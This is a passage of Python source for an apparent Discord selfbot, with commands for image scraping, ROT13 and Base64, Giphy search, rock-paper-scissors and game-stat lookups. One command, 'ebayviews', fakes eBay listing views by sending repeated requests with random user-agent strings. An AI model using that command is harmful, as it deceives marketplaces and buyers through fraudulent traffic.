                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            except Exception:
                return
        else:
            try:
                request = requests.get(f'https://rule34.xxx/index.php?page=post&s=list&tags={urllib.parse.quote(tag)}')
                soup = BeautifulSoup(request.content, 'html.parser')
                link = soup.find(id="image").get("src")
                embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rule34',timestamp=embed_timestamp())
                embed.set_image(url=link)
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            except Exception:
                return

    @React.command(usage="choose <Options>", description="Takes a random choice between options")
    async def choose(ctx, *, choices):
        options = choices.split(' ')
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Choose',timestamp=embed_timestamp())
        embed.add_field(name=f'Choice', value=random.choice(options), inline=False)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="rot13 <Text>", description="Encrypts text to ROT-13")
    async def rot13(ctx, *, text: str):
        rot13 = lambda s: codecs.getencoder('rot-13')(s)[0]
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Rot13',timestamp=embed_timestamp())
        embed.add_field(name=f'__üìÑ Text__', value=text, inline=False)
        embed.add_field(name=f'__‚öô Rot13__', value=f"{rot13(text)}", inline=False)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="unrot13 <Text>", description="Decrypts text from ROT-13")
    async def unrot13(ctx, *, rot13: str):
        try:
            derot13 = lambda s: codecs.getdecoder('rot-13')(s)[0]
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Rot13',timestamp=embed_timestamp())
            embed.add_field(name=f'__‚öô Rot13__', value=f"{rot13}", inline=False)
            embed.add_field(name=f'__üìÑ Text__', value=derot13(rot13), inline=False)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="gif <Text>", description="Searches for a gif")
    async def gif(ctx, *, text: str):
        request = requests.get(f'https://api.giphy.com/v1/gifs/search?q={text}&api_key=dc6zaTOxFJmzC')
        data = request.json()
        info = data['data'][0]
        url = info['url']
        image = info['images']['original']['url']
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Giphy', description=f'[{text}]({url})', timestamp=embed_timestamp())
        embed.set_image(url=image)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="rps <Rock/Paper/Scissors>", description="Play a game of Rock, Paper, Scissors against an AI")
    async def rps(ctx, weapon: str):
        
        options = ['Rock', 'Paper', 'Scissors']
        computer_weapon = random.choice(options)
        result = 'None'
        if computer_weapon == 'Rock' and weapon.capitalize() == 'Rock':
            result = 'Draw'
        elif computer_weapon == 'Rock' and weapon.capitalize() == 'Paper':
            result = 'User wins'
        elif computer_weapon == 'Rock' and weapon.capitalize() == 'Scissors':
            result = 'Computer wins'
        elif computer_weapon == 'Paper' and weapon.capitalize() == 'Rock':
            result = 'Computer wins'
        elif computer_weapon == 'Paper' and weapon.capitalize() == 'Paper':
            result = 'Draw'
        elif computer_weapon == 'Paper' and weapon.capitalize() == 'Scissors':
            result = 'User wins'
        elif computer_weapon == 'Scissors' and weapon.capitalize() == 'Rock':
            result = 'User wins'
        elif computer_weapon == 'Scissors' and weapon.capitalize() == 'Paper':
            result = 'Computer wins'
        elif computer_weapon == 'Scissors' and weapon.capitalize() == 'Scissors':
            result = 'Draw'
        
        if weapon.capitalize() in options:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Rock Paper Scissors',timestamp=embed_timestamp())
            embed.add_field(name=f'Your Choice', value=weapon.capitalize(), inline=False)
            embed.add_field(name=f'Computer\'s Choice', value=computer_weapon, inline=False)
            embed.add_field(name='Result', value=result)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            return
            
        
    @React.command(usage="ebayviews <Amount> <Link>", description="Adds eBay views")
    async def ebayviews(ctx, views: int, link: str=None):
        for i in range(views):
            r = requests.get(link, headers={'user-agent': f'{random_char(10)}'})

    def random_char(y):
        return ''.join(random.choice(string.ascii_letters) for x in range(y))

    @React.command(usage="tempmail", description="Creates a Temporary Mail")
    async def tempmail(ctx):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Temporary E-Mail',timestamp=embed_timestamp())
        embed.add_field(name=f'Generated E-Mail', value=f'[E-Mail Inbox](https://www.tempinbox.xyz/mailbox/{random_char(8)}@tempinbox.xyz)', inline=False)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="base64 <Encode/Decode> <Text>", description="Encode/Decode text to/from Base64")
    async def _base64(ctx, action: str, *, text: str):
        try:
            if action.lower() == 'encode':
                text_bytes = text.encode('ascii')
                base64_bytes = base64.b64encode(text_bytes)
                base64_text = base64_bytes.decode('ascii')
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Base64 Encoded Message', description=base64_text,timestamp=embed_timestamp())
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            elif action.lower() == 'decode':
                base64_bytes = text.encode('ascii')
                text_bytes = base64.b64decode(base64_bytes)
                decoded_text = text_bytes.decode('ascii')
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Base64 Decoded Message', description=decoded_text,timestamp=embed_timestamp())
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


        except Exception:
            return

    @React.command(usage="fnstats <Fortnite Name>", description="Shows the Fortnite stats of an user")
    async def fnstats(ctx, *, name: str):
        
        request = requests.get(f'https://fortnite-api.com/v1/stats/br/v2?name={urllib.parse.quote(name)}')
        data = request.json()
        info = data['data']
        bplevel = info['battlePass']['level']
        totalwins = info['stats']['all']['overall']['wins']
        totalmatches = info['stats']['all']['overall']['matches']
        totalwinrate = info['stats']['all']['overall']['winRate']
        totalkills = info['stats']['all']['overall']['kills']
        totalkd = info['stats']['all']['overall']['kd']

        solowins = info['stats']['all']['solo']['wins']
        solomatches = info['stats']['all']['solo']['matches']
        solowinrate = info['stats']['all']['solo']['winRate']
        solokills = info['stats']['all']['solo']['kills']
        solokd = info['stats']['all']['solo']['kd']

        duowins = info['stats']['all']['duo']['wins']
        duomatches = info['stats']['all']['duo']['matches']
        duowinrate = info['stats']['all']['duo']['winRate']
        duokills = info['stats']['all']['duo']['kills']
        duokd = info['stats']['all']['duo']['kd']

        triowins = info['stats']['all']['trio']['wins']
        triomatches = info['stats']['all']['trio']['matches']
        triowinrate = info['stats']['all']['trio']['winRate']
        triokills = info['stats']['all']['trio']['kills']
        triokd = info['stats']['all']['trio']['kd']

        squadswins = info['stats']['all']['squad']['wins']
        squadsmatches = info['stats']['all']['squad']['matches']
        squadswinrate = info['stats']['all']['squad']['winRate']
        squadskills = info['stats']['all']['squad']['kills']
        squadskd = info['stats']['all']['squad']['kd']

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Fortnite Stats of {name}',timestamp=embed_timestamp())
        embed.add_field(name=f'Battle Pass Level', value=f'{bplevel}', inline=True)
        embed.add_field(name=f'Total', value=f'Wins: {totalwins} \nMatches: {totalmatches} \nWinrate: {totalwinrate}% \nKills: {totalkills} \nKD: {totalkd}', inline=True)
        embed.add_field(name=f'Solo', value=f'Wins: {solowins} \nMatches: {solomatches} \nWinrate: {solowinrate}% \nKills: {solokills} \nKD: {solokd}', inline=True)
        embed.add_field(name=f'Duo', value=f'Wins: {duowins} \nMatches: {duomatches} \nWinrate: {duowinrate}% \nKills: {duokills} \nKD: {duokd}', inline=True)
        embed.add_field(name=f'Trio', value=f'Wins: {triowins} \nMatches: {triomatches} \nWinrate: {triowinrate}% \nKills: {triokills} \nKD: {triokd}', inline=True)
        embed.add_field(name=f'Squads', value=f'Wins: {squadswins} \nMatches: {squadsmatches} \nWinrate: {squadswinrate}% \nKills: {squadskills} \nKD: {squadskd}', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="csgostats <Profile ID/Name>", description="Shows CS:GO Statistics")
    async def csgostats(ctx, *, id: str):
        
        request = requests.get(f'https://reactselfbot.pro/api/tracker.php?game=csgo&id={urllib.parse.quote(id)}')
        data = request.json()
        info = data['data']
        user_id = info['platformInfo']['platformUserIdentifier']
        user_name = info['platformInfo']['platformUserHandle']
        user_av = info['platformInfo']['avatarUrl']
        time_played = info['segments'][0]['stats']['timePlayed']['displayValue']
        score = info['segments'][0]['stats']['score']['displayValue']
        kills = info['segments'][0]['stats']['kills']['value']
        deaths = info['segments'][0]['stats']['deaths']['displayValue']
        kd = info['segments'][0]['stats']['kd']['displayValue']
        damage = info['segments'][0]['stats']['damage']['value']
        headshots = info['segments'][0]['stats']['headshots']['displayValue']
        dominations = info['segments'][0]['stats']['dominations']['value']
        shots_fired = info['segments'][0]['stats']['shotsFired']['displayValue']
        shots_hit = info['segments'][0]['stats']['shotsHit']['displayValue']
        shots_accuracy = info['segments'][0]['stats']['shotsAccuracy']['displayValue']
        bombs_planted = info['segments'][0]['stats']['bombsPlanted']['displayValue']
        bombs_defused = info['segments'][0]['stats']['bombsDefused']['displayValue']
        mvp = info['segments'][0]['stats']['mvp']['displayValue']
        wins = info['segments'][0]['stats']['wins']['displayValue']
        matches_played = info['segments'][0]['stats']['matchesPlayed']['displayValue']
        headshots_pct = info['segments'][0]['stats']['headshotPct']['displayValue']       
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'CS:GO Stats of {user_name}',timestamp=embed_timestamp())
        embed.add_field(name=f'User Identifier', value=f'{user_id}', inline=True)
        embed.add_field(name=f'Time Played', value=f'{time_played}', inline=True)
        embed.add_field(name=f'Score', value=f'{score}', inline=True)
        embed.add_field(name=f'Kills', value=f'{kills}', inline=True)
        embed.add_field(name=f'Deaths', value=f'{deaths}', inline=True)
        embed.add_field(name=f'K/D', value=f'{kd}', inline=True)
        embed.add_field(name=f'Damage', value=f'{damage}', inline=True)
        embed.add_field(name=f'Headshots', value=f'{headshots}', inline=True)
        embed.add_field(name=f'Headshots Percentage', value=f'{headshots_pct}', inline=True)
        embed.add_field(name=f'Dominations', value=f'{int(dominations)}', inline=True)
        embed.add_field(name=f'Shots Fired', value=f'{shots_fired}', inline=True)
        embed.add_field(name=f'Shots Hit', value=f'{shots_hit}', inline=True)
        embed.add_field(name=f'Shots Accuracy', value=f'{shots_accuracy}', inline=True)
        embed.add_field(name=f'Bombs Planted', value=f'{int(bombs_planted)}', inline=True)
        embed.add_field(name=f'Bombs Defused', value=f'{int(bombs_defused)}', inline=True)
        embed.add_field(name=f'MVP', value=f'{mvp}', inline=True)
        embed.add_field(name=f'Wins', value=f'{wins}', inline=True)
        embed.add_field(name=f'Matches Played', value=f'{wins}', inline=True)

        embed.set_thumbnail(url=f'{user_av}')
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="rlstats <Profile ID/Name>", description="Shows Rocket League Statistics")
    async def rlstats(ctx, *, id: str):
        
        request = requests.get(f'https://reactselfbot.pro/api/tracker.php?game=rl&id={urllib.parse.quote(id)}')
        data = request.json()
        info = data['data']
        user_id = info['platformInfo']['platformUserIdentifier']
        user_name = info['platformInfo']['platformUserHandle']
        user_av = info['platformInfo']['avatarUrl']
        wins = info['segments'][0]['stats']['wins']['displayValue']
        goals = info['segments'][0]['stats']['goals']['displayValue']
        mvps = info['segments'][0]['stats']['mVPs']['displayValue']
        saves = info['segments'][0]['stats']['saves']['displayValue']
        assists = info['segments'][0]['stats']['assists']['displayValue']
        shots = info['segments'][0]['stats']['shots']['displayValue']
        goalshotratio = info['segments'][0]['stats']['goalShotRatio']['displayValue']
        score = info['segments'][0]['stats']['score']['displayValue']     
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rocket League Stats of {user_name}',timestamp=embed_timestamp())
        embed.add_field(name=f'User Identifier', value=f'{user_id}', inline=True)
        embed.add_field(name=f'Wins', value=f'{wins}', inline=True)
        embed.add_field(name=f'Goals', value=f'{goals}', inline=True)
        embed.add_field(name=f'MVPs', value=f'{mvps}', inline=True)
        embed.add_field(name=f'Saves', value=f'{saves}', inline=True)
        embed.add_field(name=f'Assists', value=f'{assists}', inline=True)
        embed.add_field(name=f'Shots', value=f'{shots}', inline=True)
        embed.add_field(name=f'Goal Shot Ratio', value=f'{goalshotratio}', inline=True)
        embed.add_field(name=f'Score', value=f'{score}', inline=True)

        embed.set_thumbnail(url=f'{user_av}')
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="apexstats <Origin Name>", description="Shows Apex Legends Statistics")
    async def apexstats(ctx, *, id: str):
        request = requests.get(f'https://reactselfbot.pro/api/tracker.php?game=apex&id={urllib.parse.quote(id)}')
        data = request.json()
        info = data['data']
        user_id = info['platformInfo']['platformUserIdentifier']
        user_name = info['platformInfo']['platformUserHandle']
        user_av = info['platformInfo']['avatarUrl']
        level = info['segments'][0]['stats']['level']['displayValue']
        active_legend = info['metadata']['activeLegendName'] 
        kills = info['segments'][0]['stats']['kills']['displayValue']
        damage = info['segments'][0]['stats']['damage']['displayValue']
        headshots = info['segments'][0]['stats']['headshots']['displayValue']
        finishers = info['segments'][0]['stats']['finishers']['displayValue']
        revives = info['segments'][0]['stats']['revives']['displayValue'] 
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Apex Legends Stats of {user_name}',timestamp=embed_timestamp())
        embed.add_field(name=f'User Identifier', value=f'{user_id}', inline=True)
        embed.add_field(name=f'Level', value=f'{level}', inline=True)
        embed.add_field(name=f'Active Legend', value=f'{active_legend}', inline=True)
        embed.add_field(name=f'Kills', value=f'{kills}', inline=True)
        embed.add_field(name=f'Damage', value=f'{damage}', inline=True)
        embed.add_field(name=f'Headshots', value=f'{headshots}', inline=True)
        embed.add_field(name=f'Finishers', value=f'{finishers}', inline=True)
        embed.add_field(name=f'Revives', value=f'{revives}', inline=True)

        embed.set_thumbnail(url=f'{user_av}')
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="valorantstats <Riot Name With Tag>", description="Shows Valorant Statistics")
    async def valorantstats(ctx, *, id: str):
        request = requests.get(f'https://reactselfbot.pro/api/tracker.php?game=valorant&id={urllib.parse.quote(id)}')
        data = request.json()
        info = data['data']
        user_id = info['platformInfo']['platformUserIdentifier']
        user_name = info['platformInfo']['platformUserHandle']
        rank = info['segments'][0]['stats']['rank']['displayValue'] 
        time_played = info['segments'][0]['stats']['timePlayed']['displayValue']
        matches_played = info['segments'][0]['stats']['matchesPlayed']['displayValue']
        matches_won = info['segments'][0]['stats']['matchesWon']['displayValue']
        matches_lost = info['segments'][0]['stats']['matchesLost']['displayValue']
        matches_win_pct = info['segments'][0]['stats']['matchesWinPct']['displayValue']
        matches_duration = info['segments'][0]['stats']['matchesDuration']['displayValue']
        econ_rating = info['segments'][0]['stats']['econRating']['displayValue']
        score = info['segments'][0]['stats']['score']['displayValue'] 
        kills = info['segments'][0]['stats']['kills']['displayValue'] 
        deaths = info['segments'][0]['stats']['deaths']['displayValue'] 
        headshots = info['segments'][0]['stats']['headshots']['displayValue'] 
        assists = info['segments'][0]['stats']['assists']['displayValue'] 
        kd_ratio = info['segments'][0]['stats']['kDRatio']['displayValue'] 
        damage = info['segments'][0]['stats']['damage']['displayValue'] 
        plants = info['segments'][0]['stats']['plants']['displayValue'] 
        defuses = info['segments'][0]['stats']['defuses']['displayValue'] 
        first_bloods = info['segments'][0]['stats']['firstBloods']['displayValue'] 
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Valorant Stats of {user_name}',timestamp=embed_timestamp())
        embed.add_field(name=f'User Identifier', value=f'{user_id}', inline=True)
        embed.add_field(name=f'Rank', value=f'{rank}', inline=True)
        embed.add_field(name=f'Time Played', value=f'{time_played}', inline=True)
        embed.add_field(name=f'Matches Played', value=f'{matches_played}', inline=True)
        embed.add_field(name=f'Matches Won', value=f'{matches_won}', inline=True)
        embed.add_field(name=f'Matches Lost', value=f'{matches_lost}', inline=True)
        embed.add_field(name=f'Matches Win Percentage', value=f'{matches_win_pct}', inline=True)
        embed.add_field(name=f'Matches Duration', value=f'{matches_duration}', inline=True)
        embed.add_field(name=f'Econ Rating', value=f'{econ_rating}', inline=True)
        embed.add_field(name=f'Score', value=f'{score}', inline=True)
        embed.add_field(name=f'Kills', value=f'{kills}', inline=True)
        embed.add_field(name=f'Deaths', value=f'{deaths}', inline=True)
        embed.add_field(name=f'Headshots', value=f'{headshots}', inline=True)
        embed.add_field(name=f'Assists', value=f'{assists}', inline=True)
        embed.add_field(name=f'KD Ratio', value=f'{kd_ratio}', inline=True)
        embed.add_field(name=f'Damage', value=f'{damage}', inline=True)
        embed.add_field(name=f'Plants', value=f'{plants}', inline=True)
        embed.add_field(name=f'Defuses', value=f'{defuses}', inline=True)
        embed.add_field(name=f'First Bloods', value=f'{first_bloods}', inline=True)
        
